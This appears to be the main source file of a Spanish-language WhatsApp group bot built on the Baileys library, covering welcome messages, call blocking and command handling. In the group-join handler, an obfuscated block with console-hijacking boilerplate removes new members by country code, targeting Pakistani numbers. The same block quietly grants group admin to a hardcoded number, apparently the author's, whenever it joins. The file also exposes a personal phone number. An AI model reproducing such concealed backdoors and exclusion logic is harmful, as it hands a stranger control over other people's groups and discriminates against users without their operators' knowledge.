# Xaomi-
Bot Xaomi 


//============ NyanBot ============\\
// + Favor de mantener este codigo
//   tal y como esta.
// + Si modificaras, manten los
//   creditos:
//   _MankBarBar & Samu & LolHuman_
//============ Samu330 ============\\
const { 
  WAConnection,
  MessageType,
  Presence, 
  MessageOptions,
  Mimetype,
  WALocationMessage,
  WA_MESSAGE_STUB_TYPES,
  ReconnectMode,
  ProxyAgent,
  GroupSettingChange,
  ChatModification,
  waChatKey,
  WA_DEFAULT_EPHEMERAL,
  mentionedJid,
  prepareMessageFromContent, 
  Browsers,
  processTime
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone");
const os = require("os");
const imageToBase64 = require('image-to-base64');
const speed = require('performance-now');
const chalk = require('chalk');
const crypto = require("crypto-js");
const CryptoJS = require("crypto-js");
const fs = require('fs');
const { wait, h2k, generateMessageID, getGroupAdmins, banner, start, info, success, close } = require('./lib/functions')
const { addBanned, unBanned, BannedExpired, cekBannedUser } = require('./lib/banned.js')
const { getLevelingXp, getLevelingId, addLevelingXp, addLevelingLevel, addLevelingId, getLevelingLevel, getUserRank, addCooldown, leveltab } = require('./lib/leveling.js')
const { removeBackgroundFromImageFile } = require('remove.bg');
const { exec } = require('child_process');
const ffmpeg = require('fluent-ffmpeg');
const axios = require('axios');
const fetch = require('node-fetch');
const request = require('request');
const fromBuffer = require('file-type');
const FormData = require('form-data')
const samuGg = require('google-it');
const samuGgImg = require('g-i-s');
const hx = require('hxz-api');
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
const { validmove, setGame } = require("./lib/tictactoe");
const simple = require('./lib/simple.js');
const {y2mateA, y2mateV} = require('./lib/y2mate.js')
const {sm330mfire} = require('./lib/mediafire.js')
const { ssstik } = require("./lib/tiktok.js")
const {fbDown} = require('./lib/fb.js')
const { isFiltered, addFilter } = require('./lib/antispam')
const chatban = JSON.parse(fs.readFileSync('./src/ban.json'))
const ban = JSON.parse(fs.readFileSync('./src/banned.json'))
const crypt = fs.readFileSync('./crypt/imp.json')
const zalgo = require('./lib/zalgo')
const {convertSticker} = require("./lib/swm.js")
const { samuBug } = require('./crypt/samuBug')
const conn = require("./lib/connect")
const msg = require("./lib/message")
const wa = require("./lib/wa")
const Exif = require('./lib/exif');
const exif = new Exif();
const { recognize } = require('./lib/ocr');
const help = require("./lib/help")
const yts = require('yt-search')
const postBuffer = help.postBuffer
const getBuffer = help.getBuffer
const getRandom = help.getRandomExt
const postJson = help.postJson
const getJson = help.getJson
const samu = JSON.parse(fs.readFileSync('./setting.json'))
const bodyM = samu.samuM
const antimedia = JSON.parse(fs.readFileSync('./src/antimedia.json'))
const antifake = JSON.parse(fs.readFileSync('./src/antifake.json'))
const antibot = JSON.parse(fs.readFileSync('./src/antibot.json'))
const bad = JSON.parse(fs.readFileSync('./src/bad.json'))
const badword = JSON.parse(fs.readFileSync('./src/badword.json'))
const autostick = JSON.parse(fs.readFileSync('./src/autostick.json'))
const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const antigp = JSON.parse(fs.readFileSync('./src/antigp.json'))
const simi = JSON.parse(fs.readFileSync('./src/simi.json'))
const legion = JSON.parse(fs.readFileSync('./src/sm330Leg.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const config = JSON.parse(fs.readFileSync("./config.json"))
const owner = config.owner
const mods = config.mods
const fake = 'Sm330'
var public = config.public
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
conn.connect()
const samu330 = conn.samu330
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
api = 'CONTACTAME PARA OBTENER LA API'
fak = 'samu3300'
prefix = '.'
apikey = 'LindowApi'
hit_today = []
blocked = []
let _level = JSON.parse(fs.readFileSync('./src/level.json'))
const _registered = JSON.parse(fs.readFileSync('./src/registered.json'))
const daily = JSON.parse(fs.readFileSync('./src/diario.json'));
const dailiy = JSON.parse(fs.readFileSync('./src/limitem.json'));
const X = "❌"
const O = "⭕️"

///////////////////////////////////////////////////////////////////////////

//========= Funcion de Registro =========\\

const getRegisteredRandomId = () => {
        return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
        const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
        _registered.push(obj)
        fs.writeFileSync('./src/registered.json', JSON.stringify(_registered))
        }

        const createSerial = (size) => {
        return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const checkRegisteredUser = (sender) => {
        let status = false
        Object.keys(_registered).forEach((i) => {
        if (_registered[i].id === sender) {
        status = true
        }
        })
            return status
        }
samu330.on('CB:action,,call', async json => {
const callerId = json[2][0][1].from;
console.log("Llamada recibida de "+ callerId)
console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ 📵Llamada recibida ]"), chalk.greenBright(callerId))
samu330.sendMessage(callerId, "Las llamadas no se permiten, *PORFAVOR LEE LAS REGLAS!* Te bloqueare😒", MessageType.text, {quoted: {key: {
fromMe: false,
participant: `0@s.whatsapp.net`
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./media/call.png`)
},
"title": `🚫No se permiten las llamadas🚫`,
"description": "",
"currencyCode": "SYP",
"priceAmount1000": "999999999999999999",
"retailerId": "",
"productImageCount": 999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}}})
await sleep(4000)
await samu330.blockUser(callerId, "add")
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('CB:action,,battery', json => {
global.batteryLevelStr = json[2][0][1].value
global.batterylevel = parseInt(batteryLevelStr)
baterai = batterylevel
if (json[2][0][1].live == 'true') charging = true
if (json[2][0][1].live == 'false') charging = false
console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ 🔋Nivel de carga de la bateria ]"), chalk.greenBright(batterylevel+'%'), chalk.keyword("cyan")("Esta cargando?"), chalk.keyword("yellow")(charging))	
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('blocklist-update', async (chat) => {
for (i of chat.added){
target = i.replace('@c.us', '@s.whatsapp.net')
blocked.push(target)
console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[ NUEVO USUARIO BLOQUEADO ]"), chalk.keyword("red")(target))
}
for (i of chat.removed){
target = i.replace('@c.us', '@s.whatsapp.net')
blocked.splice(blocked.indexOf(target), 1)
console.log(chalk.greenBright("├"), chalk.keyword("green")("[ NUEVO USUARIO DESBLOQUEADO ]"), chalk.keyword("cyan")(target))
}
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('group-update', async(chat) => {
var donde = chat.jid
var group = await samu330.groupMetadata(donde)
if (!chat.desc == '') {
var tag = chat.descOwner.split('@')[0] + '@s.whatsapp.net'
var mensajeDesc = `✍🏻 *La descripcion del grupo ${group.subject} fue modificada por: @${chat.descOwner.split('@')[0]}*\n✅Ahora la nueva descripcion es:\n\n${chat.desc}`
samu330.sendMessage(group.id, mensajeDesc, MessageType.text)
console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[ DESCRIPCION CAMBIADA ]"), chalk.keyword("cyan")('grupo'), chalk.keyword("green")(`${group.subject}`))
}
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('group-participants-update', async (anu) => {
if (!welkom.includes(anu.jid)) return
try {
const mdata = await samu330.groupMetadata(anu.jid)
console.log(anu)
if (anu.action == 'add') {               
num = anu.participants[0]
var _0x32eb=['length','203FKZwcC','constructor','text','37321dDPejz','apply','prototype','groupRemove','test','__proto__','table','1102598lCjDcW','1013436pgMCWz','info','toString','startsWith','3291GElTcg','1762sWsYhU','bind','exception','console','trace','log','648921eLIDKy','5219984907794','Ek\x20is\x20jammer,\x20maar\x20mense\x20uit\x20Asië\x20word\x20nie\x20toegelaat\x20nie,\x20ek\x20sal\x20jou\x20uitskakel,\x20dankie\x20vir\x20jou\x20begrip😚\x0a\x0aAntiP\x20By:*\x20_🐉Samu330🇲\x20🇽\x20_','return\x20/\x22\x20+\x20this\x20+\x20\x22/','sendMessage','324QcfqoI','warn','error','1148172OCGrif','23ykweMi','return\x20(function()\x20'];function _0x3b66(_0x116bb2,_0xa78ba5){return _0x3b66=function(_0x436199,_0x510667){_0x436199=_0x436199-0x70;var _0x51019a=_0x32eb[_0x436199];return _0x51019a;},_0x3b66(_0x116bb2,_0xa78ba5);}var _0x376b6b=_0x3b66;(function(_0xe31b1b,_0x46684b){var _0x30c21e=_0x3b66;while(!![]){try{var _0x598896=-parseInt(_0x30c21e(0x7e))+-parseInt(_0x30c21e(0x91))*-parseInt(_0x30c21e(0x7b))+parseInt(_0x30c21e(0x8c))+-parseInt(_0x30c21e(0x82))*-parseInt(_0x30c21e(0x70))+parseInt(_0x30c21e(0x7f))*parseInt(_0x30c21e(0x85))+-parseInt(_0x30c21e(0x8d))+-parseInt(_0x30c21e(0x76));if(_0x598896===_0x46684b)break;else _0xe31b1b['push'](_0xe31b1b['shift']());}catch(_0x4b5012){_0xe31b1b['push'](_0xe31b1b['shift']());}}}(_0x32eb,0x8c3d6));var _0xb1de39=function(){var _0xdff92c=!![];return function(_0xbaf195,_0x472290){var _0x49ae62=_0xdff92c?function(){var _0x8379c3=_0x3b66;if(_0x472290){var _0x210536=_0x472290[_0x8379c3(0x86)](_0xbaf195,arguments);return _0x472290=null,_0x210536;}}:function(){};return _0xdff92c=![],_0x49ae62;};}(),_0x46ec2c=_0xb1de39(this,function(){var _0x3a6de6=function(){var _0x52b332=_0x3b66,_0x3a1227=_0x3a6de6[_0x52b332(0x83)](_0x52b332(0x79))()[_0x52b332(0x83)]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!_0x3a1227[_0x52b332(0x89)](_0x46ec2c);};return _0x3a6de6();});_0x46ec2c();var _0x51019a=function(){var _0x1b381d=!![];return function(_0xdc464c,_0x8f91eb){var _0x4640b3=_0x1b381d?function(){var _0x37d4f6=_0x3b66;if(_0x8f91eb){var _0x4f0489=_0x8f91eb[_0x37d4f6(0x86)](_0xdc464c,arguments);return _0x8f91eb=null,_0x4f0489;}}:function(){};return _0x1b381d=![],_0x4640b3;};}(),_0x510667=_0x51019a(this,function(){var _0x3279f1=_0x3b66,_0x545df1=function(){var _0x5c6de2=_0x3b66,_0xf5f589;try{_0xf5f589=Function(_0x5c6de2(0x80)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x37444b){_0xf5f589=window;}return _0xf5f589;},_0x3ef9e5=_0x545df1(),_0x5c6ba6=_0x3ef9e5[_0x3279f1(0x73)]=_0x3ef9e5['console']||{},_0x373954=[_0x3279f1(0x75),_0x3279f1(0x7c),_0x3279f1(0x8e),_0x3279f1(0x7d),_0x3279f1(0x72),_0x3279f1(0x8b),_0x3279f1(0x74)];for(var _0x3d4618=0x0;_0x3d4618<_0x373954[_0x3279f1(0x81)];_0x3d4618++){var _0x1698c8=_0x51019a[_0x3279f1(0x83)][_0x3279f1(0x87)][_0x3279f1(0x71)](_0x51019a),_0x218220=_0x373954[_0x3d4618],_0x4beaa2=_0x5c6ba6[_0x218220]||_0x1698c8;_0x1698c8[_0x3279f1(0x8a)]=_0x51019a[_0x3279f1(0x71)](_0x51019a),_0x1698c8[_0x3279f1(0x8f)]=_0x4beaa2[_0x3279f1(0x8f)]['bind'](_0x4beaa2),_0x5c6ba6[_0x218220]=_0x1698c8;}});_0x510667();if(num[_0x376b6b(0x90)]('92'))await samu330[_0x376b6b(0x7a)](mdata['id'],_0x376b6b(0x78),MessageType[_0x376b6b(0x84)]),samu330[_0x376b6b(0x88)](mdata['id'],[num]);if(num[_0x376b6b(0x90)]('52'))await samu330[_0x376b6b(0x7a)](mdata['id'],'🇲\x20🇽\x20😈\x20*ARRIVA\x20MEXICO!!!*\x20Bienvenido\x20amigo\x20de\x20mexico,\x20de\x20que\x20parte\x20del\x20pais\x20eres?😙',MessageType['text']);if(num[_0x376b6b(0x90)](_0x376b6b(0x77)))await samu330['sendMessage'](mdata['id'],'*VAYA\x20VAYA\x20VAYAAAA🐱\x20Miren\x20nomas\x20quien\x20llego🥳,\x20es\x20mi\x20dueño!!!!😱\x20WOW\x20Saludenlo!😚*\x0a\x0a_*Le\x20dare\x20admin\x20juju*_',MessageType[_0x376b6b(0x84)]),samu330['groupMakeAdmin'](mdata['id'],[num]);

/*if (num.startsWith('1')) return samu330.groupRemove(mdata.id, [num])
if (num.startsWith('994')) return samu330.groupRemove(mdata.id, [num])
if (num.startsWith('48')) return samu330.groupRemove(mdata.id, [num])
if (num.startsWith('91')) return samu330.groupRemove(mdata.id, [num])
if (num.startsWith('44')) return samu330.groupRemove(mdata.id, [num])*/
const moment = require('moment-timezone')
const jm = moment.tz('America/Mexico_City').format('HH:mm:ss')
let d = new Date
let locale = 'es'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})

try {
pushnem = sam.key.fromMe ? samu330.user.name : conts.notify || conts.vname || conts.name || '-'

} catch {
pushnem = num.split('@')[0]
}
try {
ppimg = await samu330.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
} catch {
ppimg = 'https://centromedicomontemar.cl/wp-content/uploads/2015/06/sin-perfil.png'
}
try {
let fotoP = await getBuffer(ppimg)
samu330.sendMessage(mdata.id, `${fotoP}`, MessageType.image, {quoted: {key: {
fromMe: false,
participant: `0@s.whatsapp.net`          
},                               
message: {                         
"productMessage": {
"product": {
"productImage":{          
"mimetype": "image/jpeg",             
"jpegThumbnail": fs.readFileSync(`./src/fake.jpg`)           
},                                
"title": `Bienvenido a ${mdata.subject}`,
"description": "",                
"currencyCode": "SYP",                  
"priceAmount1000": "999999999999999999",
"retailerId": "",
"productImageCount": 999
},                          
"businessOwnerJid": `0@s.whatsapp.net`
}}}, caption: `😙Hola, @${num.split('@')[0]}, _*Bienvenido a ${mdata.subject}, esperamos que te la pases a gusto en este grupo✨*_\n\n_Recuerda siempre seguir las reglas y mantener una formalidad respetuosa_😉\n\nSon las *${jm}* del *${calender}*\n\n${mdata.desc}`, contextInfo: { mentionedJid: [num] }})
} catch {
samu330.sendMessage(mdata.id, `😙Hola, @${num.split('@')[0]}, _*Bienvenido a ${mdata.subject}, esperamos que te la pases a gusto en este grupo✨*_\n\n_Recuerda siempre seguir las reglas y mantener una formalidad respetuosa_😉\n\nSon las *${jm}* del *${calender}*\n\n${mdata.desc}`, MessageType.text)
}
//leave
}  else if (anu.action == 'remove') {
num = anu.participants[0]
teks = `_Weno ps.... amm😪...  @${num.split('@')[0]} se nos fue, ni llorar es bueno:)_
_*Ojala y le baya bien, y mas despues..... que lo atropelle un tren!!🚉🤣*_
*No se awiten gente, esten seguros que nadie lo extrañara:D*`
samu330.sendMessage(mdata.id, teks, MessageType.text,{ contextInfo: {"mentionedJid": [num]}})

} else if (anu.action == 'promote') {
num = anu.participants[0]
try {
ppimg = await samu330.getProfilePicture(`${num.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
thu = await samu330.getStatus(anu.participants[0], MessageType.text)
teks = `*✅NUEVO ADMIN✅*\n*🙋🏻‍♂️ Nombre*: @${num.split('@')[0]}\n*📋 INFO*: ${thu.status}\n\n🥳 *FEILICIDADES!!*, te as convertido en administrador del grupo ${mdata.subject}`
let buff = await getBuffer(ppimg)
samu330.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
} else if (anu.action == 'demote') {
num = anu.participants[0]
try {
ppimg = await samu330.getProfilePicture(`${num.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
thu = await samu330.getStatus(anu.participants[0], MessageType.text)
teks = `*❌UN ADMIN MENOS❌*\n*🙋🏻‍♂️ Nombre*: @${num.split('@')[0]}\n*📋 INFO*: ${thu.status}\n\n*😪Nimodos, ya no eres admnistrador del grupo* ${mdata.subject}`
let buff = await getBuffer(ppimg)
samu330.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
}
} catch (e) {
console.log('Error : %s', color(e, 'red'))
}
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('chat-update', async(sam) => {
    try {
        if (!sam.hasNewMessage) return
        if (!sam.messages) return
        if (sam.key && sam.key.remoteJid == 'status@broadcast') {
	}
	sam = sam.messages.all()[0]
	sam.message = (Object.keys(sam.message)[0] === 'ephemeralMessage') ? sam.message.ephemeralMessage.message : sam.message
        if (!sam.message) return
        const from = sam.key.remoteJid
	const content = JSON.stringify(sam.message)
        const type = Object.keys(sam.message)[0]
        const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
        const quoted = type == 'extendedTextMessage' && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const typeQuoted = Object.keys(quoted)[0]
        const body = sam.message.conversation || sam.message[type].caption || sam.message[type].text || ""
        //chats = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : ''
        const chats = (type === 'chat') ? body : (type === 'image' || type === 'video') ? caption : ''
        //budy = (type === 'conversation' && sam.message.conversation.startsWith(prefix)) ? sam.message.conversation : (type == 'imageMessage') && sam.message.imageMessage.caption.startsWith(prefix) ? sam.message.imageMessage.caption : (type == 'videoMessage') && sam.message.videoMessage.caption.startsWith(prefix) ? sam.message.videoMessage.caption : (type == 'extendedTextMessage') && sam.message.extendedTextMessage.text.startsWith(prefix) ? sam.message.extendedTextMessage.text : ''
	    budy = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : ''
       //budy = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : (type === 'listResponseMessage') ? sam.message.listResponseMessage.title : ''
	   var _0x56fb=["\x6C\x69\x73\x74\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65","\x73\x65\x6C\x65\x63\x74\x65\x64\x44\x69\x73\x70\x6C\x61\x79\x54\x65\x78\x74","\x6D\x65\x73\x73\x61\x67\x65","","\x6B\x65\x79\x73","\x73\x74\x69\x63\x6B\x65\x72\x4D\x65\x73\x73\x61\x67\x65","\x62\x61\x73\x65\x36\x34","\x66\x69\x6C\x65\x53\x68\x61\x32\x35\x36"];resbutton= (type== _0x56fb[0])?sam[_0x56fb[2]][_0x56fb[0]][_0x56fb[1]]:_0x56fb[3];const commandstik=Object[_0x56fb[4]](sam[_0x56fb[2]])[0]== _0x56fb[5]?sam[_0x56fb[2]][_0x56fb[5]][_0x56fb[7]].toString(_0x56fb[6]):_0x56fb[3]
	   selectedButton = (type == 'buttonsResponseMessage') ? sam.message.buttonsResponseMessage.selectedButtonId : ''
	////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
        if (prefix != "") {
        if (!body.startsWith(prefix)) {
        cmd = false
        comm = ""
        } else {
        cmd = true
        comm = body.slice(1).trim().split(" ").shift().toLowerCase()
        }
        } else {
        cmd = false
        comm = body.trim().split(" ").shift().toLowerCase()
        }
	    
	////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲

	const uploadImages = (filePath) => {
	return new Promise(async (resolve, reject) => {
        const fileData = fs.readFileSync(filePath)
        const form = new FormData()
        form.append('file', fileData, 'tmp.png')
        fetch('https://telegra.ph/upload', {
	method: 'POST',
        body: form
        })
        .then(res => res.json())
        .then(res => {
        if (res.error) return reject(res.error)
        resolve('https://telegra.ph' + res[0].src)
        })
        .then(() => fs.unlinkSync(filePath))
        .catch(err => reject(err))
	})
	}

        const command = comm
        hit_today.push(command)
	const chats1 = (type === 'chat') ? body : ((type === 'image' || type === 'video')) ? caption : ''
	const samu = '```'
    m = simple.smsg(samu330, sam)
	const otherBot = m.isBaileys
	const crypto = require('crypto')
        const args = body.trim().split(/ +/).slice(1)
        const isCmd = body.startsWith(prefix)
        const meNumber = samu330.user.jidi
        const botNumber = samu330.user.jid.split("@")[0]
        const isGroup = from.endsWith('@g.us')
	const sender = sam.key.fromMe ? samu330.user.jid : isGroup ? sam.participant : sam.key.remoteJid
        const senderNumber = sender.split("@")[0]
        const groupMetadata = isGroup ? await samu330.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const groupAdmins = isGroup ? await wa.getGroupAdmins(groupMembers) : []
        const isAdmin = groupAdmins.includes(sender) || false
        const botAdmin = groupAdmins.includes(samu330.user.jid)
        const itsMe = senderNumber == botNumber
	const isBadWord = isGroup ? badword.includes(from) : false
	const isAntiLink = isGroup ? antilink.includes(from) : false
	const isAntigp = isGroup ? antigp.includes(from) : false
	const isAntiMedia = isGroup ? antimedia.includes(from) : false
	const isAntiFake = isGroup ? antifake.includes(from) : false
    const isAntiBot = isGroup ? antibot.includes(from) : false
	const isAutoSt = isGroup ? autostick.includes(from) : false
	const isNsfw = isGroup ? nsfw.includes(from) : false
	const isSimi = isGroup ? simi.includes(from): false
	const isAntiLeg = isGroup ? legion.includes(from): false
	const isWelkom = isGroup ? welkom.includes(from) : false
	const isRegister = checkRegisteredUser(sender)
	const totalchat = await samu330.chats.all()
        const isOwner = senderNumber == owner || senderNumber == botNumber || mods.includes(senderNumber)
	const isBanChat = chatban.includes(from)
	if (isBanChat && !isOwner) return
	const isBan = cekBannedUser(sender, ban)
	const q = args.join(' ')
	const texto1 = q.substring(0, q.indexOf('|') - 0)
	const texto2 = q.substring(q.lastIndexOf('|') + 1)
	var pes = (type === 'conversation' && sam.message.conversation) ? sam.message.conversation : (type == 'imageMessage') && sam.message.imageMessage.caption ? sam.message.imageMessage.caption : (type == 'videoMessage') && sam.message.videoMessage.caption ? sam.message.videoMessage.caption : (type == 'extendedTextMessage') && sam.message.extendedTextMessage.text ? sam.message.extendedTextMessage.text : ''
	const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
	conts = sam.key.fromMe ? samu330.user.jid : samu330.contacts[sender] || {
                notify: jid.replace(/@.+/, '')
	}
	const jid = sender
	const argss = body.split(/ +/g)
	//samu330.chatRead(from)
	const Smname = sam.key.fromMe ? samu330.user.jid : samu330.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const mentionByTag = type == "extendedTextMessage" && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
        const mentions = (teks, memberr, id) => {
	(id == null || id == undefined || id == false) ? samu330.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : samu330.sendMessage(from, teks.trim(), extendedText, {quoted: sam, contextInfo: {"mentionedJid": memberr}})
	}
	let pushname = sam.key.fromMe ? samu330.user.name : conts.notify || conts.vname || conts.name || '*Amigo*'
	const isUrl = (url) => {
	return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
	const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
	const sendMess = (hehe, teks) => {
	samu330.sendMessage(hehe, teks, MessageType.text, {quoted: ftoko})
  	}

    const katalog = (teks) => {
        res = samu330.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": "*_© Samu330_*", "thumbnail": fs.readFileSync('./src/ara.png'), "surface": 'CATALOG' }}, {quoted:sam})
        samu330.relayWAMessage(res)
   }
	
	mess = {
			wait: '⌛ 𝐄𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐎 ⌛',
			success: '✔️ 𝙎𝙐𝙎𝙎𝙀𝙎 ✔️',
			nsfw: `𝗟𝗼 𝘀𝗶𝗲𝗻𝘁𝗼 𝗽𝗲𝗿𝗼 𝗻𝗼 𝗽𝘂𝗲𝗱𝗼 𝗲𝗷𝗲𝗰𝘂𝘁𝗮𝗿 𝗲𝘀𝗲 𝗰𝗼𝗺𝗮𝗻𝗱𝗼, 𝗲𝘀𝘁𝗲 𝗴𝗿𝘂𝗽𝗼 𝗻𝗼 𝗽𝗲𝗿𝗺𝗶𝘁𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝗶𝗱𝗼 +𝟭𝟴\n*PARA ACTIVAR LOS COMANDOS +18, USA:* ${prefix}+18 1`, 
			ferr: 'Intentalo de nuevo mas tarde',
			error: {
			stick: '[❗] 𝙀𝙍𝙍𝙊𝙍 intentalo de nuevo, da error a la primera:D  ❌',
			Iv: '❌ Link invalido ❌'
			},
			only: {
    			group: '[❗] ¡Este comando solo se puede usar en grupos! ❌',
    			benned: '⚠ *USTED ES UN USUARIO BANEADO, ESO QUIERE DECIR QUE NO PUEDE USAR EL BOT* ⚠',
    			ownerG: '[❗] ¡Este comando solo puede ser utilizado por el creador del grupo! ❌',
    			ownerB: '[❗] ¡Este comando solo puede ser utilizado por el creador del bot! ❌\nOsea, Samu: wa.me/+529984907794, Habla con el para que pueda cambiar el numero del owner en este bot',
    			admin: '[❗] ¡Este comando solo puede ser utilizado por administradores del grupo! ❌',
    			Badmin: '[❗] ¡Este comando solo se puede usar cuando el bot es administrador! ❌',
    			usrReg: `Usuario no *Registrado*\n_Para registrarte usa el comando_: *${prefix}reg*`
  			}
			}

	const momento1 = require('moment-timezone')
	const hora = momento1.tz('America/Mexico_City').format('HH:mm:ss')
	let d1 = new Date
	let locale1 = 'es'
	let gmt1 = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
	let ayer = ['domingo','lunes','Martes','Miercoles','Jueves','Viernes','Sabado'][
	Math.floor(((d1 * 1) + gmt1) / 84600000) % 7]
	let week1 = d1.toLocaleDateString(locale1, { weekday: 'long' })
	let calender1 = d1.toLocaleDateString(locale1, {
	day: 'numeric',
	month: 'long',
	year: 'numeric'
	})


	const hour_now = moment().format('HH')
        var timeFt = '*Buenos dias🌅*'
        if (hour_now >= '03' && hour_now <= '10') {
          timeFt = 'Buenos dias'
        } else if (hour_now >= '10' && hour_now <= '14') {
          timeFt = '*Buenos dias🌅*'
        } else if (hour_now >= '14' && hour_now <= '17') {
          timeFt = 'Buenas tardes🌇'
        } else if (hour_now >= '17' && hour_now <= '18') {
          timeFt = 'Buenas tardes🌇'
        } else if (hour_now >= '18' && hour_now <= '23') {
          timeFt = 'Buenas noches🌃'
        } else {
          timeFt = 'Buen inicio del dia!🌱'
        }
        

        const isImage = type == 'imageMessage'
        const isVideo = type == 'videoMessage'
        const isAudio = type == 'audioMessage'
        const isSticker = type == 'stickerMessage'
        const isContact = type == 'contactMessage'
        const isLocation = type == 'locationMessage'
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
	const isTexto = type == 'textMessage'
        
        typeMessage = body.substr(0, 50).replace(/\n/g, '')
        if (isImage) typeMessage = "Image"
        else if (isVideo) typeMessage = "Video"
        else if (isAudio) typeMessage = "Audio"
        else if (isSticker) typeMessage = "Sticker"
        else if (isContact) typeMessage = "Contact"
        else if (isLocation) typeMessage = "Location"
	else if (isTexto) typeMessage = "text"

        const isQuoted = type == 'extendedTextMessage'
	const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')
        const isQuotedImage = isQuoted && typeQuoted == 'imageMessage'
        const isQuotedVideo = isQuoted && typeQuoted == 'videoMessage'
        const isQuotedAudio = isQuoted && typeQuoted == 'audioMessage'
        const isQuotedSticker = isQuoted && typeQuoted == 'stickerMessage'
        const isQuotedContact = isQuoted && typeQuoted == 'contactMessage'
        const isQuotedLocation = isQuoted && typeQuoted == 'locationMessage'

        if (!public) {
        mods.indexOf(botNumber) === -1 ? mods.push(botNumber) : false
